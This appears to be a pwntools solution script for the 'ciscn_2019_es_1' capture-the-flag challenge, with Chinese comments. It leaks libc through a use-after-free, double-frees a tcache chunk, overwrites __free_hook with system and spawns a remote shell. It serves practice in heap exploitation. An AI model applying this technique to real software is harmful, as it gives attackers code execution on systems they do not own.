from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25840
elfpath = './ciscn_2019_es_1_patched'
libcpath = '/home/leo/tmp/libc2.27/libc6_2.27-3ubuntu1_amd64.so'

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

def command(c):
    ru(b'choice:')
    sl(str(c).encode())

def add(size, name, phoneNumber):
    command(1)
    ru(b'Please input the size of compary\'s name\n')
    sl(str(size).encode())
    ru(b'please input name:\n')
    s(name)
    ru(b'please input compary call:\n')
    s(phoneNumber)

# def edit(index, size, content):

def free(index):
    command(3)
    ru(b'Please input the index:\n')
    sl(str(index).encode())

def show(index):
    command(2)
    ru(b'Please input the index:\n')
    sl(str(index).encode())
    
    
# start pwning
'''
保护全开
根据提示，这是2.29的libc？
有个uaf，free之后没有置0，所以也可以double free。
那这样的话思路就很明显了：
uaf通过unsorted bin泄露libc，然后double free任意地址chunk分配，修改free_hook为one_gadget或者system函数地址都行
'''

add(0x410, b'a', b'1') # 0
add(0x60, b'a', b'1') # 1
add(0x10, b'a', b'1') # 2
add(0x10, b'/bin/sh\x00', b'1') # 3

free(0)
show(0)

libc = ELF(libcpath)
malloc_hook = u64(ru7f()[-6:].ljust(8, b'\x00')) - 96 - 0x10
su(f"malloc_hook: {hex(malloc_hook)}")
libc_base = malloc_hook - libc.sym['__malloc_hook']
su(f"libc base: {hex(libc_base)}")

# one_gadget打不通
one_gadget = [0x4f322, 0x10a38c]

system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
free(2)
free(2)
add(0x10, p64(free_hook), b'1') # 4
# add(0x10, p64(one_gadget[1] + libc_base), b'1')
add(0x10, p64(system), b'1')
free(3)

shell()

